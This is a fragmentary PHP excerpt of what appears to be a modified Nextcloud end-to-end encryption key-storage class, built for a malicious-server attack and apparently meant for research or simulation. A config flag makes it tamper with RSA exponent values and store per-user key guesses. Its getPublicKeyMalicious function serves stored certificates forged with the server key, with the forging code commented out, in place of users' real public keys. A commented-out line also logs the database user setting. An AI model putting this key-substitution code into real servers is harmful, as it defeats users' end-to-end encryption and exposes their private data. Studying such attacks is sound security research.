...
class KeyStorage implements IKeyStorage {
	...
	public function __construct(IAppData $appData,
		...
		$e2e_public_key_attack =  $config->getSystemValue('e2e_public_key_attack', false);
		if ($e2e_public_key_attack){
			/*
			 * This is to simulate the first phase of the attack with 5 tries before hitting the
			 * correct d
			 * */
			$e = new BigInteger($config->getSystemValue('e2e_public_key_exponent'));
			$this->e = $e->add( new BigInteger(-4) )->toString();
			$this->n = $config->getSystemValue('e2e_public_key_modulus');
			$this->lambda = $config->getSystemValue('e2e_public_key_lambda');
		}
...
//		$e2e_public_key_attack =  $config->getSystemValue('e2e_public_key_attack', false);
//		$tmp =  $config->getSystemValue('dbuser');
//		error_log($tmp);
	...
	private function getPublicKeyGuess($uid){
		$this->verifyFolderStructure();
		$fileName = $this->getFileNameForPublicKey($uid).'attempt';
		try {
			return $this->appData->getFolder($this->publicKeysRoot)
				->getFile($fileName)
				->getContent();
	...
	private function setPublicKeyGuess($uid, $e, $end='attempt'){
		$this->verifyFolderStructure();
		$fileName = $this->getFileNameForPublicKey($uid).$end;
		$publicKeyRoot = $this->appData->getFolder($this->publicKeysRoot);
		$publicKeyRoot
			->newFile($fileName)
			->putContent($e);
	...
	public function getPublicKeyMalicious(string $uid, $server_key ){
//		$e = new BigInteger($this->getPublicKeyGuess($uid));
//		$e = $e->add(new BigInteger(1));
//		$n = new BigInteger($this->n);
//		$this->setPublicKeyGuess($uid, $e);
//
//		$client_key = PublicKeyLoader::load(['e' => new BigInteger('65537'),
//			'n' => $n
//		]);
//		$client_key = $client_key->withPadding(RSA::SIGNATURE_PKCS1);
//		$server_key = $server_key->withPadding(RSA::SIGNATURE_PKCS1);
//
//		$x509 = new X509();
//		$x509->loadX509($this->getPublicKey($uid));
//		$subject = new X509();
//		$subject->setPublicKey($client_key); // $pubKey is a PublicKey objet
//		$subject->setDN($x509->getDN());
//
//		$issuer = new X509();
//		$issuer->setPrivateKey($server_key); // $privKey is a PrivateKey object
//		$issuer->setDNProp('CN', 'nextcloud');
//		$issuer->setDNProp('C' , 'DE');
//		$issuer->setDNProp('ST', 'Baden--Wuerttemberg');
//		$issuer->setDNProp('O' , 'Nextcloud');
//
//
//		$x509 = new X509();
//		$result = $x509->sign($issuer, $subject);
//		$this->setPublicKeyGuess($uid, $x509->saveX509($result), "cert");

		$this->verifyFolderStructure();
		$fileName = $this->getFileNameForPublicKey($uid).'cert';
		return $this->appData->getFolder($this->publicKeysRoot)
			->getFile($fileName)
			->getContent();
